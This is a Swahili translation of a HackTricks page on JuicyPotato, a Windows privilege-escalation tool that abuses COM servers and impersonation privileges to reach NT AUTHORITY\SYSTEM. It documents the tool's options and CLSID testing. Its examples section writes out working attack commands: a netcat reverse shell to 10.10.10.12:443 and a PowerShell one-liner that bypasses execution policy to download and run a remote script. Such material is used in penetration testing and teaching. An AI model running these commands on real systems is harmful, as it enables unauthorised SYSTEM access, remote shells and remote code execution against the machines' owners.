# JuicyPotato

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, unataka kuona **kampuni yako ikionekana kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato haitafanyi kazi** kwenye Windows Server 2019 na Windows 10 toleo la 1809 na baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) inaweza kutumika kwa **kutumia mamlaka sawa na kupata ufikiaji wa kiwango cha `NT AUTHORITY\SYSTEM`**. _**Angalia:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (kutumia mamlaka ya dhahabu) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_To leo tamu la_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, na tone la maji, yaani **zana nyingine ya Kupandisha Mamlaka ya Kienyeji, kutoka kwa Akaunti za Huduma za Windows hadi NT AUTHORITY\SYSTEM**_

#### Unaweza kupakua juicypotato kutoka [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Muhtasari <a href="#summary" id="summary"></a>

[Kutoka kwa SomaMe ya juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [toleo lake](https://github.com/decoder-it/lonelypotato) linatumia mnyororo wa kupandisha mamlaka kulingana na [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [huduma](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ikiwa na msikilizaji wa MiTM kwenye `127.0.0.1:6666` na unapokuwa na mamlaka ya `SeImpersonate` au `SeAssignPrimaryToken`. Wakati wa ukaguzi wa ujenzi wa Windows tuligundua usanidi ambapo `BITS` ulizuiliwa kwa makusudi na bandari `6666` ilichukuliwa.

Tuliamua kuwezesha [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Sema hello kwa Juicy Potato**.

> Kwa nadharia, angalia [Rotten Potato - Kupandisha Mamlaka kutoka kwa Akaunti za Huduma hadi SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) na fuata mnyororo wa viungo na marejeo.

Tuligundua kwamba, zaidi ya `BITS` kuna seva za COM kadhaa tunaweza kutumia vibaya. Wanahitaji tu:

1. iweze kuanzishwa na mtumiaji wa sasa, kawaida "mtumiaji wa huduma" ambaye ana mamlaka ya udanganyifu
2. tekeleza kiolesura cha `IMarshal`
3. kufanya kazi kama mtumiaji aliyeinuliwa (SYSTEM, Msimamizi, …)

Baada ya majaribio tulipata na kujaribu orodha ndefu ya [CLSID's za kuvutia](http://ohpe.it/juicy-potato/CLSID/) kwenye toleo kadhaa za Windows.

### Maelezo ya Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato inakuruhusu:

* **Lengo la CLSID** _chagua CLSID yoyote unayotaka._ [_Hapa_](http://ohpe.it/juicy-potato/CLSID/) _unaweza kupata orodha iliyopangwa kulingana na OS._
* **Bandari ya Kusikiliza COM** _fafanua bandari ya kusikiliza COM unayopendelea (badala ya 6666 iliyowekwa kimarshall)_
* **Anwani ya IP ya Kusikiliza COM** _funga seva kwenye IP yoyote_
* **Hali ya Uumbaji wa Mchakato** _kulingana na mamlaka ya mtumiaji aliyejifanya unaweza kuchagua kutoka:_
* `CreateProcessWithToken` (inahitaji `SeImpersonate`)
* `CreateProcessAsUser` (inahitaji `SeAssignPrimaryToken`)
* `zote mbili`
* **Mchakato wa Kuzindua** _zindua faili inayoweza kutekelezwa au script ikiwa unyanyasaji unafanikiwa_
* **Hoja ya Mchakato** _customize vigezo vya mchakato uliozinduliwa_
* **Anwani ya Seva ya RPC** _kwa njia ya siri unaweza kuthibitisha kwa seva ya RPC ya nje_
* **Bandari ya Seva ya RPC** _inayofaa ikiwa unataka kuthibitisha kwa seva ya nje na firewall inazuia bandari `135`…_
* **Hali ya MAJARIBIO** _hasa kwa madhumuni ya majaribio, yaani kujaribu CLSIDs. Inaunda DCOM na kuchapisha mtumiaji wa token. Angalia_ [_hapa kwa majaribio_](http://ohpe.it/juicy-potato/Test/)

### Matumizi <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Mawazo ya mwisho <a href="#mawazo-ya-mwisho" id="mawazo-ya-mwisho"></a>

[**Kutoka kwa Mwongozo wa Juicy Potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Ikiwa mtumiaji ana ruhusa za `SeImpersonate` au `SeAssignPrimaryToken` basi wewe ni **SYSTEM**.

Ni karibu haiwezekani kuzuia matumizi mabaya ya seva zote hizi za COM. Unaweza kufikiria kuhusu kubadilisha ruhusa za vitu hivi kupitia `DCOMCNFG` lakini kila la heri, hii itakuwa changamoto.

Suluhisho halisi ni kulinda akaunti na programu nyeti ambazo zinaendeshwa chini ya akaunti za `* SERVICE`. Kusitisha `DCOM` bila shaka itazuia shambulio hili lakini inaweza kuwa na athari kubwa kwa mfumo wa uendeshaji uliopo.

Kutoka: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Mifano

Tafadhali tembelea [ukurasa huu](https://ohpe.it/juicy-potato/CLSID/) kwa orodha ya CLSIDs za kujaribu.

### Pata kabati la kurudi la nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev

### Powershell rev

### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Anzisha CMD mpya (ikiwa una ufikiaji wa RDP)

![](<../../.gitbook/assets/image (297).png>)

## Matatizo ya CLSID

Maranyingi, CLSID ya msingi ambayo JuicyPotato hutumia **haifanyi kazi** na shambulio linashindwa. Kawaida, inachukua majaribio mengi kupata CLSID **inayofanya kazi**. Ili kupata orodha ya CLSIDs za kujaribu kwa mfumo wa uendeshaji fulani, unapaswa kutembelea ukurasa huu:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Kuangalia CLSIDs**

Kwanza, utahitaji baadhi ya programu za kutekeleza mbali na juicypotato.exe.

Pakua [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) na upakie kwenye kikao chako cha PS, na pakua na tekeleza [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Skripti hiyo itaunda orodha ya CLSIDs za kujaribu.

Kisha pakua [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(badilisha njia ya orodha ya CLSID na kwa kutekelezeka kwa juicypotato) na tekeleza. Itaanza kujaribu kila CLSID, na **wakati nambari ya bandari inabadilika, itamaanisha kwamba CLSID imefanya kazi**.

**Angalia** CLSIDs zinazofanya kazi **kwa kutumia parameter -c**

## Marejeo

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, unataka kuona **kampuni yako ikionyeshwa kwenye HackTricks**? au ungependa kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
